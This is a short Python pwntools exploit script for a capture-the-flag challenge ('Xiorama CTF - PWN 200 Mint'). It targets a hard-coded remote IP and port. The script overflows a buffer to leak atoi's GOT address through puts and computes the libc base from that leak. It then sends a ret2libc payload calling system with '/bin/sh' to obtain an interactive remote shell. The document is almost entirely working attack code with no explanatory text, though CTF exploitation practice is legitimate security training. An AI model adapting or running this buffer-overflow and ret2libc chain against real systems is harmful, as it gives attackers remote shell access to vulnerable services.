#!/usr/bin/python

from pwn import *

#Author : Abdeljalil Nouiri
# Xiorama CTF - PWN 200 Mint

"""
#LOCAL
sysoff = 0x00040310
readoff = 0x000daf60
atoioff = 0x000318e0
shoff = 0x16084c
"""

#Remote
sysoff  = 0x0003ada0
atoioff = 0x0002d250
shoff   = 0x0015b82b

atoiGOT = 0x0804a028
PUTS = 0x08048420
MAIN = 0x08048754

#con = process("./mint")
con = remote('139.59.61.220',42345)

def pwny(PLD):
	pld = "A"*42
	con.recvuntil(":")
	con.sendline("1")
	con.sendline(pld)
	con.recvuntil(":")
	con.sendline("2")
	con.recvuntil("Overwrite")
	con.sendline("1")
	con.sendline(PLD)
	con.recvuntil(":")
	con.sendline("5")
	data = con.recv()
	data2 = data.split("\n")

	leaked = u32(data2[0])
	libc_base = leaked - atoioff
	#READ = libc_base + readoff
	SYSTEM = libc_base + sysoff
	BINSH = libc_base + shoff

	log.info("libc base : "+hex(libc_base))
	log.info("system : "+hex(SYSTEM))

	####
	con.sendline("1")
	con.sendline(pld)
	con.recvuntil(":")
	con.sendline("2")
	con.recvuntil("Overwrite")
    con.sendline("1")

	payload = "A"*32
	payload += p32(SYSTEM)
	payload += p32(0x42424242)
	payload += p32(BINSH)

	con.sendline(payload)

	con.recvuntil(':')
	con.sendline("5")
	con.interactive()


payload = ""
payload += "A"*32
payload += p32(PUTS)
payload += p32(MAIN)
payload += p32(atoiGOT)


pwny(payload)